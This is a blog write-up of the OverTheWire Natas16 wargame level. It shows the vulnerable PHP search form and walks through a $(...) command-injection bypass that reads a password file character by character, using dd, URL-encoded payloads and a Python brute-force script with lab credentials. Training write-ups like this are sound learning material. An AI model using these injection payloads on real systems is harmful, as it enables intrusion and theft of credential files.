---
layout: post
title:  "Natas16: Bruteforcing Remote Command Execution"
date:   2017-08-18 14:15:50 -0400
categories: master
---

The source code:

```
<body>
<h1>natas16</h1>
<div id="content">

For security reasons, we now filter even more on certain characters<br/><br/>
<form>
Find words containing: <input name=needle><input type=submit name=submit value=Search><br><br>
</form>


Output:
<pre>
<?
$key = "";

if(array_key_exists("needle", $_REQUEST)) {
    $key = $_REQUEST["needle"];
}

if($key != "") {
    if(preg_match('/[;|&`\'"]/',$key)) {
        print "Input contains an illegal character!";
    } else {
        passthru("grep -i \"$key\" dictionary.txt");
    }
}
?>
</pre>

<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
</div>
</body>
```

Despite the tightened restraints, this level is still vulnerable to unintended command execution with the use of `$(command)`

For example, inputting the regular expression:
```
^[$(cat /etc/natas_webpass/natas17)][a-z][a-z]$
``` 
returns all three-lettered words in `dictionary.txt` that start with any letter that's contained in the natas17 password file.

For further enumeration of the password, we can issue the following regular expression with the `dd` command:
```
^[$(dd status=none bs=1 count=1 skip=0 if=/etc/natas_webpass/natas17)][a-z][a-z]$
```
The `dd` command can read bytes of a file. `bs` is block size. Since our password file is ASCII and char variables are only 1 byte in length, `bs` is set to 1. `count` is how many blocks of size `bs` we want. We're only checking one letter at a time, so `count` is set to 1 as well. `skip` is number of bytes to skip at start of file. We change this from 0 to 31 to get whatever character we want from the password file, which is 32 bytes. `skip=0` gives us the first character.

The above input will not return anything, which means that the first character of the password is a digit and not a character.

Setting `skip=1` returns a list of 3-lettered words that start with p. This means that the second character of the password is either p or P.

We can fine-tune the above to the following if-statement:
```
$(if [ $(dd status=none bs=1 count=1 skip=1 if=/etc/natas_webpass/natas17) = p ]
then echo misconstrued
else echo falsehoods
fi)
```
We'll have to URL-encode this and inject it directly into the url. Newline `\n` will get encoded at `%20`.

```
%24(if%20%5B%20%24(dd%20status%3Dnone%20bs%3D1%20count%3D1%20skip%3D1%20if%3D%2Fetc%2Fnatas_webpass%2Fnatas17)%20%3D%20p%20%5D%0Athen%20echo%20misconstrued%20%0Aelse%20echo%20falsehoods%20%0Afi)
```

Which returns `falsehoods`. Changing the lowercase p to uppercase P returns `misconstrued`, which means that the second character of the password is P.

We can now use the above to create a simple python script that will brute-force the password one character at a time:
```
import requests

password = ""
array = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"

for i in range(0, 32):
	for j in range(0, len(array)):
		password += array[j]
		query = "%24(if [ %24(dd status%3Dnone bs%3D1 count%3D1 skip%3D" + str(i)
		query += " if%3D%2Fetc%2Fnatas_webpass%2Fnatas17) %3D " + array[j]
		query += " ]%0Athen %0Aecho misconstrued %0Aelse %0Aecho falsehoods %0Afi)"
		req = requests.post("http://natas16.natas.labs.overthewire.org/?needle=" + query + "&Submit=Search",
			auth=('natas16', 'WaIHEacj63wnNIBROHeqi3p9t0m5nhmh'))
		if "misconstrued" in req.text:
			print("password: " + password)
			break
		else:
			password = password[:-1]

```

Running the script until completion will give the complete password. Not shown here for the sake of spoilers.

```
root@kali:~# python natas16.py
password: 8
password: 8P
password: 8Ps
password: 8Ps3
password: 8Ps3H
password: 8Ps3H0
password: 8Ps3H0G
password: 8Ps3H0GW
password: 8Ps3H0GWb
password: 8Ps3H0GWbn
password: 8Ps3H0GWbn5
password: 8Ps3H0GWbn5r
password: 8Ps3H0GWbn5rd
[and so on]
```
